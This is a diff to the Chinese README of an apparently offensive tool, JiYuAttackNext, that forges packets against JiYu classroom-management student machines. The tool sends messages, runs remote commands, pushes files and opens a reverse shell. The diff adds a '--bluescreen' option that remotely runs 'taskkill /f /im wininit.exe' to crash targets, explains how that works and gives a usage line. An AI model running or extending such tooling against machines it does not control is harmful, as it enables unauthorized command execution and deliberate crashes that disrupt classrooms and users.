@@ -39,7 +39,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 | `remote message` | 文本消息 | 给学生机弹一句话：`-msg` 或 `--msg-file` 二选一，`-l` / `-t` 管重复轮次与间隔 |
 | `remote command` | 远程命令 | 让学生机执行一条命令行（`-c`），不回显输出 |
 | `remote file` | 文件传送 | 把文件或文件夹丢到学生机桌面（`--file`） |
-| `remote device` | 设备操作 | `--reboot` 重启、`--shutdown` 关机、`--logoff` 注销；三个动作互斥，重启与关机用固定报文，不带倒计时与提示 |
+| `remote device` | 设备操作 | `--reboot` 重启、`--shutdown` 关机、`--logoff` 注销、`--bluescreen` 蓝屏；四个动作互斥，重启与关机用固定报文，不带倒计时与提示 |
 | `remote shell` | 反弹终端 | 在学生机上开一个可以一直打字的命令行 |
 | `restriction student` | 启停学生端 | 按当前状态启动或结束本机极域学生端，腾出被独占的 4705 端口 |
 | `local info` | 本机信息 | 查自己这台机器的 IP 和学生端端口 |
@@ -57,7 +57,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 | 来源 | 对应功能 |
 | --- | --- |
 | `Jiyu_udp_attack` | 文本消息（`remote message`）、远程命令（`remote command`）、重启与关机（`remote device`）、本机信息（`local info`）、防火墙规则（`local firewall`）的报文结构 |
-| 本程序新增 | 注销（`remote device --logoff`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`restriction student`） |
+| 本程序新增 | 注销（`remote device --logoff`）、蓝屏（`remote device --bluescreen`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`restriction student`） |
 
 来源的 `-e r` / `-e s` 是重发一份固定模板，本程序照旧重发同一份模板；来源的 `-e nc` 依赖外网脚本与 `powercat`，本程序的 `remote shell` 自己起脚本服务。
 
@@ -199,8 +199,11 @@ start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 | `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
 | `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
 | `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
+| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令执行 `taskkill /f /im wininit.exe` |
 
-三个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销没有独立报文，走远程命令通道执行 `shutdown /l`。
+四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道，命令文本分别为 `shutdown /l` 与 `taskkill /f /im wininit.exe`。
+
+蓝屏的原理是结束会话管理器进程 `wininit.exe`，Windows 会判定关键进程被终止而立即进入蓝屏并重启。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
 
 ### remote shell（反弹终端）
 
@@ -418,7 +421,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 分组命令一次只做一项操作。需要顺序执行时，应等待前一个命令结束再运行下一个。
 
-### 发送重启、关机或注销指令
+### 发送重启、关机、注销或蓝屏指令
 
 ```powershell
 # 重启目标
@@ -429,6 +432,9 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 # 注销目标当前登录用户
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
+
+# 触发目标蓝屏（结束会话管理器，机器随后重启）
+.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --bluescreen
 ```
 
 ### 反弹终端
